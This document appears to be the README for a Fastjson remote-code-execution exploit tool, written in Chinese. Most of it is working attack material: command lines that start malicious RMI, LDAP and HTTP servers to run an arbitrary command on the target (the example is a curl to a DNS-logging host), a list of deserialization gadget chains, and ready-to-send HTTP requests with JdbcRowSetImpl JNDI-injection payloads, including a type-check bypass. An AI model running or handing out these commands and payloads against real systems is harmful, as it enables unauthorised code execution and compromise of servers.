# fastjson_rce_tool

```
1. 启动RMI服务
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
:使用 EvilRMIServer 创建一个rmi服务, rmi的端口为1099，另一个socket通信的端口8888，后面写要执行的命令。

2. 启动LDAP或者RMI服务+HTTP服务 (4和5的结合)
java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
或
java -cp fastjson_tool.jar EvilRMIServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
:使用 LDAPRefServer3 创建一个LDAP服务和一个HTTP服务，1099为ldap/rmi服务的端口, 127.0.0.1为机器外网IP地址，8888为http的端口，后面写要执行的命令。
使用ldap服务的话，最推荐使用这个，前提是目标机器可以有最少2个端口出来。

3. 启动LDAP服务2
java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
:使用 LDAPRefServer2 创建一个LDAP服务，1099为ldap服务的端口，后面写要用发序列化的payload，以及要执行的命令，
使用ldap服务的话，目标机器只有1个端口可以出来，建议尝试使用这个。
可以用的反序列payload如下：
CommonsBeanutils1  
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Groovy1            
URLDNS             
JSON1              
Spring1            
Spring2            
file   （BASE64编码后的反序列内容文件）



4. 启动ldap服务1
java -cp fastjson_tool.jar LDAPRefServer http://127.0.0.1:8888/#Object 1099
:使用 LDAPRefServer 创建一个LDAP服务，http://127.0.0.1:8888/#Object为要访问加载恶意class的http服务，1099为LDAP服务的端口。

5. 启动http服务器
java -cp fastjson_tool.jar EvilHttpService 127.0.0.1 8888
:使用 EvilHttpService ,创建一个http服务，127.0.0.1为机器的外网IP，8888为http服务的端口。

```


```

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn" jdk8

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}


3. 查看日志是否执行成功


===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}


3. 查看日志是否执行成功

===================================================================================================

else:
有些环境可能利用不成功，可以尝试默认的测试方法,


=======================================================
最常用的2个如下：
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}

{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}}

```

